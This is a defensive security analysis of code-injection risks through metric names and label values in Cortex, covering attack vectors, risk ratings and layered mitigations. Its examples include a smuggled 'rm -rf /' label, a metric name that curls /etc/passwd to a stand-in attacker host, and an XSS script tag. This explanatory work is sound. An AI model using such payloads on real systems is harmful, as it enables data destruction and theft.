## Deep Analysis: Inject Code via Metrics or Labels in Cortex

This analysis delves into the attack path "Inject Code via Metrics or Labels" within a Cortex application, focusing on its technical feasibility, potential impact, and effective mitigation strategies. While the provided attributes indicate a lower likelihood, the high impact warrants a thorough understanding and proactive defense.

**Understanding the Attack Vector:**

The core of this attack lies in exploiting the way Cortex ingests and processes metric data. Cortex relies on receiving time-series data, which includes metric names and associated labels. If an attacker can inject malicious code into these fields, and if Cortex or a downstream system interprets or processes these fields without proper sanitization, they could potentially execute arbitrary code.

**Detailed Breakdown:**

* **Mechanism of Injection:** Attackers could attempt to inject code through various means:
    * **Exploiting Ingestion Endpoints:**  Cortex exposes APIs for pushing metrics (e.g., Prometheus remote write). If these endpoints lack robust input validation, an attacker could craft malicious metric names or label values containing executable code or commands.
    * **Compromised Data Sources:** If the source of the metric data (e.g., an application exporting metrics) is compromised, the attacker could manipulate the emitted metrics before they reach Cortex.
    * **Man-in-the-Middle Attacks:**  While less likely for HTTPS, a sophisticated attacker could potentially intercept and modify metric data in transit if encryption is weak or improperly implemented.
    * **Internal Misconfiguration:**  A misconfigured component within the Cortex stack (e.g., a poorly secured sidecar process) could be leveraged to inject malicious data.

* **Code Execution Context:** The success and impact of the injected code depend heavily on where and how the malicious payload is interpreted. Potential execution contexts include:
    * **Cortex Components:**  If the injected code exploits a vulnerability within Cortex components like the ingester, distributor, or querier, it could be executed within the context of that process. This could lead to data breaches, service disruption, or even complete control of the Cortex instance.
    * **Downstream Systems:**  Cortex data is often consumed by other systems for visualization (Grafana), alerting (Prometheus Alertmanager), or further processing. If these downstream systems are vulnerable to code injection via metric data, the attacker could pivot and compromise those systems. For example, a Grafana dashboard displaying a metric with a malicious label could execute JavaScript code within a user's browser.
    * **Logging and Monitoring Systems:**  If Cortex logs or monitoring systems process metric data without sanitization, the injected code could be executed within the context of those systems.

**Why the Attributes are as Defined:**

* **Likelihood: Low:**  While theoretically possible, successfully injecting and executing code via metrics or labels requires a deep understanding of Cortex internals and potential vulnerabilities. Modern systems often implement basic input validation. However, the complexity of metric data and the various processing stages can create overlooked opportunities.
* **Impact: High:**  Successful code injection is inherently a high-impact vulnerability. It can lead to:
    * **Data Breaches:** Accessing and exfiltrating sensitive metric data or even data from other systems if Cortex is compromised.
    * **Service Disruption:** Crashing Cortex components, leading to loss of monitoring and alerting capabilities.
    * **Lateral Movement:** Using the compromised Cortex instance as a stepping stone to attack other systems within the infrastructure.
    * **Supply Chain Attacks:** If Cortex is used to monitor a product or service, manipulating metrics could lead to misleading information and potentially impact end-users.
* **Effort: Medium-High:**  Crafting effective code injection payloads that bypass existing security measures and achieve the desired outcome requires significant effort and experimentation. Understanding the specific vulnerabilities within Cortex or downstream systems is crucial.
* **Skill Level: Advanced:** This attack requires a deep understanding of:
    * Cortex architecture and data flow.
    * Common injection techniques (e.g., command injection, script injection).
    * Potential vulnerabilities in data processing libraries or components.
    * Bypassing security measures like input validation and escaping.
* **Detection Difficulty: Difficult:**  Maliciously crafted metric names or labels can be difficult to distinguish from legitimate data, especially if the attack is subtle. Standard anomaly detection might not flag these injections unless they cause significant deviations in metric values or patterns. Detecting code execution within downstream systems based on metric data can also be challenging.

**Potential Attack Vectors in Detail:**

1. **Malicious Label Values:**
    * **Scenario:** An attacker crafts a metric with a label value containing a command injection payload. For example, a label like `hostname=`; `rm -rf /`;`` could be injected.
    * **Exploitation:** If a Cortex component or a downstream system uses this label value in a command or script without proper sanitization, the `rm -rf /` command could be executed.
    * **Example:** A poorly written custom exporter might directly use label values in system calls.

2. **Malicious Metric Names:**
    * **Scenario:** An attacker injects a metric with a name containing executable code. For example, a metric named `system.load.average`; `curl attacker.com/exfiltrate?data=$(cat /etc/passwd)`;``.
    * **Exploitation:** If a downstream system processes metric names without proper escaping or validation, this could lead to command execution.
    * **Example:** A custom alerting rule in Prometheus Alertmanager might be vulnerable if it directly uses metric names in shell commands.

3. **Exploiting Query Language Vulnerabilities:**
    * **Scenario:** While not directly "injecting code via metrics," attackers could craft malicious queries that exploit vulnerabilities in Cortex's query language (PromQL) or downstream query engines.
    * **Exploitation:**  This could lead to information disclosure, denial of service, or potentially even remote code execution if the query engine has vulnerabilities.
    * **Example:**  A poorly implemented PromQL function might be susceptible to buffer overflows or other memory corruption issues.

4. **Cross-Site Scripting (XSS) via Metric Data:**
    * **Scenario:** An attacker injects malicious JavaScript code into label values.
    * **Exploitation:** When this metric data is displayed in a web-based visualization tool like Grafana, the injected JavaScript could execute in the user's browser, potentially stealing cookies or performing actions on their behalf.
    * **Example:** A label value like `<script>alert('XSS')</script>` could trigger an alert when the metric is displayed in Grafana.

**Mitigation Strategies:**

To effectively defend against this attack path, the development team should implement a multi-layered approach:

* **Robust Input Validation and Sanitization:**
    * **Strictly validate all incoming metric data:** Implement checks on metric names and label values, enforcing allowed characters, lengths, and formats.
    * **Sanitize data before processing and storage:**  Escape or remove potentially harmful characters and sequences from metric names and label values. Use established libraries and functions for sanitization.
    * **Apply validation at the ingestion endpoints:**  Prevent malicious data from entering the system in the first place.

* **Secure Coding Practices:**
    * **Avoid direct execution of untrusted data:**  Never directly use metric names or label values in shell commands or script execution without thorough sanitization and validation.
    * **Use parameterized queries:** When querying data, use parameterized queries to prevent SQL injection-like attacks if Cortex uses an underlying database.
    * **Follow the principle of least privilege:** Ensure that Cortex components and downstream systems operate with the minimum necessary permissions.

* **Security Hardening of Cortex Components:**
    * **Keep Cortex and its dependencies up-to-date:** Regularly patch vulnerabilities.
    * **Configure authentication and authorization:**  Restrict access to Cortex APIs and components.
    * **Secure communication channels:** Ensure HTTPS is properly configured for all communication between Cortex components and external systems.

* **Security for Downstream Systems:**
    * **Educate users about the risks of displaying untrusted data:**  Warn users about the potential for XSS vulnerabilities when viewing dashboards.
    * **Implement Content Security Policy (CSP):**  Configure CSP headers in visualization tools to mitigate XSS attacks.
    * **Sanitize data before displaying it:** Visualization tools should sanitize metric data before rendering it in dashboards.

* **Monitoring and Detection:**
    * **Implement anomaly detection:** Monitor metric data for unusual patterns or values that might indicate malicious activity.
    * **Log and audit all API requests:**  Track who is pushing metrics and what data is being ingested.
    * **Set up alerts for suspicious activity:**  Alert on attempts to inject unusual characters or patterns in metric data.

* **Regular Security Audits and Penetration Testing:**
    * **Conduct regular security audits of the Cortex codebase and configuration.**
    * **Perform penetration testing to identify potential vulnerabilities.**  Specifically test for injection vulnerabilities in metric ingestion and processing.

**Conclusion:**

While the likelihood of successfully injecting code via metrics or labels in a well-maintained Cortex application might be low, the potential impact is significant. By implementing robust input validation, secure coding practices, and continuous monitoring, the development team can significantly reduce the risk of this attack vector. It's crucial to remember that security is an ongoing process, and regular assessments and updates are necessary to stay ahead of potential threats. The "Detailed Breakdown" provided in the attack tree serves as a crucial reminder of the potential consequences and should be used to prioritize mitigation efforts.
